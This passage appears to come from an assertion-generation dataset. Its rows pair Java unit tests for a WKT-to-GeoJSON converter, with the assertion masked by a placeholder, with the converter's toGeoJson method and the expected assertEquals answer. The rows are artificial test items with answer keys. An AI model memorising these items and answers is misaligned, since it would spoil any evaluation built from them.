match(SQLQueryExpr expr) throws SQLFeatureNotSupportedException { expr.accept(findAllSubQuery);  if (isContainSubQuery(findAllSubQuery)) { if (isSupportedSubQuery(findAllSubQuery)) { return true; } else { throw new SQLFeatureNotSupportedException( ""Unsupported subquery. Only one EXISTS or IN is supported""); } } else { return false; } }"	assertFalse(rewriteRule.match(SqlParserUtils.parse(sql)))
"convertPoint_NoRedundantSpaces_ShouldConvert() { String wkt = ""POINT(12.3 13.3)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Point"", ""coordinates"": [12.3,13.3]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPoint_WithRedundantSpaces_ShouldConvert() { String wkt = "" POINT ( 12.3 13.3 )   ""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Point"", ""coordinates"": [12.3,13.3]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPoint_RoundNumbers_ShouldConvert() { String wkt = ""POINT(12 13)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Point"", ""coordinates"": [12,13]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPoint_FirstIsRoundNumber_ShouldConvert() { String wkt = ""POINT(12 13.3)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Point"", ""coordinates"": [12,13.3]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPoint_SecondIsRoundNumber_ShouldConvert() { String wkt = ""POINT(12.2 13)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Point"", ""coordinates"": [12.2,13]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPoint_NegativeCoordinates_ShouldConvert() { String wkt = ""POINT(-12.2 13)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Point"", ""coordinates"": [-12.2,13]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPolygon_NoRedundantSpaces_ShouldConvert() { String wkt = ""POLYGON ((30 10, 40 40, 20 40, 10 20, 30 10))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Polygon"", ""coordinates"": [[[30,10],[40,40],[20,40],[10,20],[30,10]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPolygon_NegativeCoordinates_ShouldConvert() { String wkt = ""POLYGON ((-30 10, 40 40, 20 40, 10 20, -30 10))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Polygon"", ""coordinates"": [[[-30,10],[40,40],[20,40],[10,20],[-30,10]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPolygon_WithRedundantSpaces_ShouldConvert() { String wkt = "" POLYGON  ( (30  10, 40    40 , 20 40, 10  20, 30 10 ) ) ""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Polygon"", ""coordinates"": [[[30,10],[40,40],[20,40],[10,20],[30,10]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPolygonWithHole_NoRedundantSpaces_ShouldConvert() { String wkt = ""POLYGON ((35 10, 45 45, 15 40, 10 20, 35 10),(20 30, 35 35, 30 20, 20 30))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Polygon"", ""coordinates"":"" + "" [[[35,10],[45,45],[15,40],[10,20],[35,10]],[[20,30],[35,35],[30,20],[20,30]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertPolygonWithHole_WithRedundantSpaces_ShouldConvert() { String wkt = ""POLYGON ( (35 10, 45 45, 15 40, 10 20, 35 10 ), (20 30 , 35 35, 30 20,   20 30 ) ) ""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""Polygon"", ""coordinates"":"" + "" [[[35,10],[45,45],[15,40],[10,20],[35,10]],[[20,30],[35,35],[30,20],[20,30]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertLineString_NoRedundantSpaces_ShouldConvert() { String wkt = ""LINESTRING (30 10, 10 30, 40 40)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""LineString"", ""coordinates"": [[30,10],[10,30],[40,40]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertLineString_NegativeCoordinates_ShouldConvert() { String wkt = ""LINESTRING (-30 10, 10 30, 40 40)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""LineString"", ""coordinates"": [[-30,10],[10,30],[40,40]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertLineString_WithRedundantSpaces_ShouldConvert() { String wkt = ""LINESTRING (     30  10, 10 30 , 40 40    )""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""LineString"", ""coordinates"": [[30,10],[10,30],[40,40]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiPolygon_NoRedundantSpaces_ShouldConvert() { String wkt = ""MULTIPOLYGON (((30 20, 45 40, 10 40, 30 20)),((15 5, 40 10, 10 20, 5 10, 15 5)))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiPolygon"", ""coordinates"":"" + "" [[[[30,20],[45,40],[10,40],[30,20]]],[[[15,5],[40,10],[10,20],[5,10],[15,5]]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiPolygon_WithRedundantSpaces_ShouldConvert() { String wkt = ""MULTIPOLYGON ( ((30 20, 45 40, 10 40, 30 20) ) , ((15 5, 40 10, 10 20, 5 10, 15 5)))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiPolygon"", ""coordinates"":"" + "" [[[[30,20],[45,40],[10,40],[30,20]]],[[[15,5],[40,10],[10,20],[5,10],[15,5]]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiPolygon_OnePolygonHaveHoles_ShouldConvert() { String wkt = ""MULTIPOLYGON (((30 20, 45 40, 10 40, 30 20),(20 30, 35 35, 30 20, 20 30)),((15 5, 40 10,"" + "" 10 20, 5 10, 15 5)))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiPolygon"", ""coordinates"":"" + "" [[[[30,20],[45,40],[10,40],[30,20]],[[20,30],[35,35],[30,20],[20,30]]],[[[15,5],[40,10],[10,20],[5,10],[15,5]]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiPoint_V1_ShouldConvert() { String wkt = ""MULTIPOINT (10 40, 40 30, 20 20, 30 10)""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiPoint"", ""coordinates"": [[10,40],[40,30],[20,20],[30,10]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiPoint_V2_ShouldConvert() { String wkt = ""MULTIPOINT ((10 40), (40 30), (20 20), (30 10))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiPoint"", ""coordinates"": [[10,40],[40,30],[20,20],[30,10]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiLineString_NoRedundantSpaces_ShouldConvert() { String wkt = ""MULTILINESTRING ((10 10, 20 20, 10 40),(40 40, 30 30, 40 20, 30 10))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiLineString"", ""coordinates"":"" + "" [[[10,10],[20,20],[10,40]],[[40,40],[30,30],[40,20],[30,10]]]}""; Assert.""<AssertPlaceHolder>""; }
toGeoJson(String wkt) { wkt = wkt.toLowerCase(); int startOfCoordinates = wkt.indexOf(""(""); if (startOfCoordinates == -1) { throw new IllegalArgumentException( StringUtils.format(""Failed to convert well-known-text [%s] to geometry type"", wkt)); }  String wktType = wkt.substring(0, startOfCoordinates).trim(); wkt = wkt.substring(startOfCoordinates);  String type = """"; String coordinates = """"; switch (wktType) { case (""point""): type = ""Point""; coordinates = pointCoordinatesFromWkt(wkt); break; case (""polygon""): type = ""Polygon""; coordinates = polygonCoordinatesFromWkt(wkt); break; case (""linestring""): type = ""LineString""; coordinates = lineStringCoordinatesFromWkt(wkt); break; case (""multipolygon""): type = ""MultiPolygon""; coordinates = multiPolygonCoordinatesFromWkt(wkt); break; case (""multipoint""): type = ""MultiPoint""; coordinates = multiPointCoordinatesFromWkt(wkt); break; case (""multilinestring""): type = ""MultiLineString""; coordinates = multiLineStringCoordinatesFromWkt(wkt); break; default: throw new IllegalArgumentException(""Unsupported well-known-text type: "" + wktType); }  return buildGeoJson(type, coordinates); }"	assertEquals(expectedGeoJson, geoJson)
"convertMultiLineString_WithRedundantSpaces_ShouldConvert() { String wkt = ""MULTILINESTRING ( (10 10, 20 20, 10   40 ) , (40 40, 30 30, 40 20, 30 10))""; String geoJson = WktToGeoJsonConverter.toGeoJson(wkt); String expectedGeoJson = ""{""type"":""MultiLineString"", ""coordinates"":"" + "" [[[10,10],[20,20],[10,40]],[[40,40],[30,30],[40,20],[30,10]]]}""; Assert.""<AssertPlaceHolder>""; }
